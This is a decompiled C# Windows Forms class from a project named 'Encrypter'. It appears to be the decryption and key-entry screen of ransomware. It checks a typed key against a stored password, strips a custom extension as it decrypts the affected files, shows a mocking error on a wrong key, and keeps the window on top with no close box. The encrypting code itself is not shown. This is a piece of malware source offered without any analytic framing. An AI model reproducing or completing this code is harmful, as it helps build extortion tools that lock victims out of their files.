using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Encrypter;

public class Decrypt : Form
{
	private IContainer components = null;

	private Button button1;

	private ProgressBar progressBar1;

	private TextBox textBox1;

	public Decrypt()
	{
		InitializeComponent();
	}

	public void Decrp()
	{
		string password = Program.password;
		IEnumerable<string> enumerable = Program.Files();
		progressBar1.set_Maximum(enumerable.Count());
		foreach (string item in enumerable)
		{
			if (!File.GetAttributes(item).HasFlag(FileAttributes.Directory) && Path.GetExtension(item) == "." + Program.ext)
			{
				Program.FileDecrypt(item, item.Substring(0, item.Length - (Program.ext.Length + 1)), item.Substring(0, item.Length - (Program.ext.Length + 1)) + password);
				ProgressBar obj = progressBar1;
				obj.set_Value(obj.get_Value() + 1);
			}
		}
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox1).get_Text() == Program.password)
		{
			((Control)button1).set_Enabled(false);
			Decrp();
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("Invalid key!", "Suka blyat!", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		button1 = new Button();
		progressBar1 = new ProgressBar();
		textBox1 = new TextBox();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(12, 12));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(428, 35));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Decrypt");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)progressBar1).set_Location(new Point(12, 53));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(428, 23));
		progressBar1.set_Style((ProgressBarStyle)1);
		((Control)progressBar1).set_TabIndex(1);
		((Control)textBox1).set_Location(new Point(12, 82));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(428, 20));
		((Control)textBox1).set_TabIndex(2);
		((Control)textBox1).set_Text("Type key here!");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(452, 110));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Decrypt");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("Decrypt files");
		((Form)this).set_TopMost(true);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
